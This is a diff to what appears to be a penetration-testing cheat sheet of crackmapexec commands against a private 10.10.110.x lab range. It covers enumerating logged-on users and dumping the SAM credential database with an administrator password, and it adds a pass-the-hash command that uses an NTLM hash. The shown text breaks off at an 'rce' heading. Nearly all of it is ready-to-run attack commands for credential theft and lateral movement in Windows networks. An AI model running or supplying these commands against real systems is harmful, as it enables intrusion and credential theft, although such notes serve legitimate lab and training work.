@@ -1,4 +1,3 @@
-
 # user enum
 ```
 crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
@@ -9,8 +8,10 @@ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-us
 crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 ```
 
-
-
+# pth
+```
+crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+```
 
 # rce
 ```
